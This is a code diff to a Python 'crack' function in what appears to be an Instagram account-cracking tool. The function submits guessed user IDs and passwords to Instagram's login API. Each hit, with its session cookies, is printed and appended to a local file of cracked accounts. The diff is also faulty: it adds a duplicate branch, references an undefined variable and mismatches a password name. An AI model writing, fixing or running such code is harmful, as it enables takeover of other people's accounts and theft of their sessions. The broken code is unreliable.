@@ -166,18 +166,24 @@ def crack(uid, pww, total_idz):
                 'x-requested-with': 'XMLHttpRequest',}
             login_url = 'https://i.instagram.com/api/v1/web/accounts/login/ajax/'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
+            session_cookies = response.cookies.get_dict()
             if response.status_code == 200:
                 json_response = response.json()
                 if json_response.get('status') == 'ok':
                    if json_response.get('authenticated') == True:
-                        session_cookies = response.cookies.get_dict()
+                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
                         oks.append(uid)
                         return True
                    elif  json_response.get('auth_token'):
-                        session_cookies = response.cookies.get_dict()
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {session_cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        oks.append(uid)
+                        return True
+                   elif  json_response.get('auth_token'):
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
